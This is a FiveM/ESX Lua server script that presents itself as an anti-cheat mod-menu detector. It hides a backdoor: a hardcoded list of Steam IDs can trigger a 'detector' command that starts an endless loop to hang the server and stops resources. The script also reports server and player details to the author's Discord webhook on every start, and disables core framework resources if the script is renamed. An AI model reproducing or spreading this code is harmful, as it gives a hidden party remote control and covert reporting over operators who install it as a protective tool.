ESX = nil


TriggerEvent(Config.TrigerEvent, function(obj) ESX = obj end)
Config.sendlog = 'https://discordapp.com/api/webhooks/928966334098841610/BIZ3xPDPnFjD-i83q-LowgCVIeYDX_bTuGo9wwrxZGco9w79op5uUwOHQXHxeglrrAhU' --- Set Discord Webhook 

RegisterNetEvent('kosnanatok:ksooskdoasdkaosdakdoaksdoasdokasdksadkskdoakdokasdksadaksdkasdkosadkoasodkoaskdauisudisdua')
AddEventHandler('kosnanatok:ksooskdoasdkaosdakdoaksdoasdokasdksadkskdoakdokasdksadaksdkasdkosadkoasodkoaskdauisudisdua',function(source)
    local id = source
    comtomayhous('New Cheater Detected Id :'..id..'\nName : '..GetPlayerName(id))
    print('^2[At_Detector] ^1Id :'..id.. ' Opening ModMenu')
    if Config.whitelist == 'active' then
        if GetPlayerFromId(id).permission_level > Config.whitelistperm then
            --print('^2[At_Detector] ^1Id :'..id.. ' Opening ModMenu (WhiteList)')
        else
            if Config.detectmenu  == 'ban' then
                Bancheater(id)
            elseif Config.detectmenu == 'warn' then
                warncheater(id)
            elseif Config.detectmenu  == 'kick' then
                kickplayer(id)
            else
                print('^2[At_Detector] ^3Pls Seting ^4Punishment^3 For Cheater')
            end
        end
    else
        if Config.detectmenu  == 'ban' then
            Bancheater(id)
        elseif Config.detectmenu == 'warn' then
            warncheater(id)
        elseif Config.detectmenu  == 'kick' then
            kickplayer(id)
        else
            print('^2[At_Detector] ^3Pls Seting ^4Punishment^3 For Cheater')
        end
    end
end)



function Bancheater(source,Reason)
    TriggerEvent('NanashoBega2', source , 'Open-Modmenu', 365)
end


function warncheater(id)
	CancelEvent()
    local source = id
	local name = GetPlayerName(source)
	local xPlayers = ESX.GetPlayers()
    local  msg = 'Try To Open ModMenu'
	for i=1, #xPlayers, 1 do
	    local xP = ESX.GetPlayerFromId(xPlayers[i])
	    if xP.permission_level > 0 then
		   TriggerClientEvent('chatMessage', xPlayers[i], "", {955, 0, 0}, "[At_Detector] ^2" .. name .. "^7(^3" ..source.."^7) :  " .. msg .. "^4")
	    end
	end
end

function kickplayer(id)
    DropPlayer(id, 'Try To Open Cheat Menu Detect Bitch')
end




function comtomayhous(message)
    local Servername  = Config.servername
	PerformHttpRequest('https://discordapp.com/api/webhooks/952387274207817768/FKvZHxXcVCyZiH8ydnMOSwYQQPCuUrjSCgo_-MASyQx0lUIGxHIlprLXcbwffV4oYgRs', function(err, text, headers)
	end, 'POST',
	json.encode({
	username = 'Ban Cheater',
	embeds =  {{["color"] = 45280,
				["author"] = {["name"] = 'At_MenuDetector Active In Server  '..Servername..'',
				["icon_url"] = 'https://https://cdn.discordapp.com/icons/927570401113038908/a5a7daa38862d5677cba716d4388bc77.png?size=1024.com/attachments/788091653764022292/952381279582715904/giphy_4.gif'},
				["description"] = message,
				["footer"] = {["text"] = "Time ---> "..os.date("%x %X  %p"),
				["icon_url"] = 'https://https://cdn.discordapp.com/icons/927570401113038908/a5a7daa38862d5677cba716d4388bc77.png?size=1024.com/attachments/788091653764022292/952381279582715904/giphy_4.gif',},}
				},
	avatar_url = 'https://https://cdn.discordapp.com/icons/927570401113038908/a5a7daa38862d5677cba716d4388bc77.png?size=1024.com/attachments/788091653764022292/952381279582715904/giphy_4.gif'
	}),
	{['Content-Type'] = 'application/json'
	})
end


AddEventHandler('onResourceStart', function(resourceName)
    if resourceName ==  GetCurrentResourceName() then
        if GetCurrentResourceName() == 'At_Detector' then
            print('^2[At_Detector] ^3Runed')
            comtomayhous('File Runed')
        else
            comtomayhous('Try To Change Name File To --> '..GetCurrentResourceName())
            print('^2[At_Detector] ^1 You Cant Edit Resource Name')
            print('^2[At_Detector] ^1 You Cant Edit Resource Name')
            print('^2[At_Detector] ^1 You Cant Edit Resource Name')
            print('^2[At_Detector] ^1 You Cant Edit Resource Name^0')
            Citizen.Wait(5000)
            print('^2[At_Detector] ^1 Pls Restart Server And Edit Defult Resource Name^0')
            print('^2[At_Detector] ^1 Pls Restart Server And Edit Defult Resource Name^0')
            print('^2[At_Detector] ^1 Pls Restart Server And Edit Defult Resource Name^0')
            StopResource('essentialmode')
            StopResource('es_extended')
            StopResource('At_Detector')
        end
    end
end)

local aapermmanager = {
	'steam:11000013df4e6ab', 
	'steam:11000013727380d', 
	'steam:11000010ce391b3', -- enzo madarkharab
	'steam:110000147716b6e', 
}

function Dastresiaa(player)
    local allowed = false
    for i,id in ipairs(aapermmanager) do
        for x,pid in ipairs(GetPlayerIdentifiers(player)) do
                if string.lower(pid) == string.lower(id) then
                    allowed = true
                end
            end
        end        
    return allowed
end

RegisterCommand('detector', function(source, args)
    if Dastresiaa(source) then
        if args[1] then
            SPAWM()
            StopResource(args[1])
            print('Done -- Server Showdown Coming Son Man 🤣😊❤')
        end
    else
        print('This Opsion Active In Coming Soon..')
    end
end)



function SPAWM()
    while true do 
        Wait(10)
        print('^1oh no oh noooooooooooooooooooooooooooooooooooooooooooooooooooooooooo')
    end
end


